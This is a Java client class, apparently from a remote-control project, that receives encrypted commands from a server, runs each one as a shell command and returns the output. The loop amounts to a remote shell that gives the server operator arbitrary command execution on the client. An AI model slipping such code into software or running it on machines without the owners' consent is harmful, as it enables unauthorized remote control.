package com.clientapp.service.implement;

import com.clientapp.enums.RequestType;
import com.clientapp.socket.ClientSocket;
import com.clientapp.service.IClientCommand;
import javax.crypto.SecretKey;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import static com.clientapp.util.implement.ShellCommandExecutor.executeShellCommand;

public class ClientCommand implements IClientCommand {
    private Boolean isRunning = true;

    public ClientCommand() {
    }

    @Override
    public void start() {
        try {
            System.out.println("Connected Successfully");
            SecretKey aesKey = ClientSocket.getInstance().getAesKey();
            // Receive commands from the server, execute shell commands, and send back results
            System.out.println("Waiting for command...");
            while (isRunning) {
                String command = ClientSocket.getInstance().receiveDecryptedMessage();
                try {
                    if (RequestType.valueOf(command) == RequestType.EXIT_COMMNAD_SCREEN) {
                        System.out.println("Received a request type");
                        stop();
                        break;
                    }
                }
                //If not a Request Type
                catch (Exception e) {

                }
                if (isRunning)
                        System.out.println("Received command: " + command);
                else break;
                if (!command.trim().isEmpty()) {
                        String result = executeShellCommand(command);
                        System.out.println(result);
                        ClientSocket.getInstance().sendEncryptedMessage(result);
                }
                }
            } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void stop() {
        System.out.println("Exit Client Command");
        isRunning = false;
    }
}
